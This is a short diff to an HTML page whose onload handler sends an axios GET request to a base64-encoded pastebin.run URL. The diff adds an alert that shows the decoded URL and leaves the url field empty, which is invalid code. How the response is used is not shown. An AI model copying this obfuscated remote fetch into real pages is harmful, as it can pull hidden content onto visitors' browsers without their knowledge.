@@ -16,9 +16,10 @@
 <body onload="req()">
   <h1 id="text">testing</h1>
   <script>
+    alert(window.atob('aHR0cHM6Ly9wYXN0ZWJpbi5ydW4vdnozZ3RwY3c2bTM5'));
     function req() {
       const get = {
-          url:window.atob('aHR0cHM6Ly9wYXN0ZWJpbi5ydW4vdnozZ3RwY3c2bTM5'),
+          url:,
           method:'GET'
        }
           axios(get).then(res => {
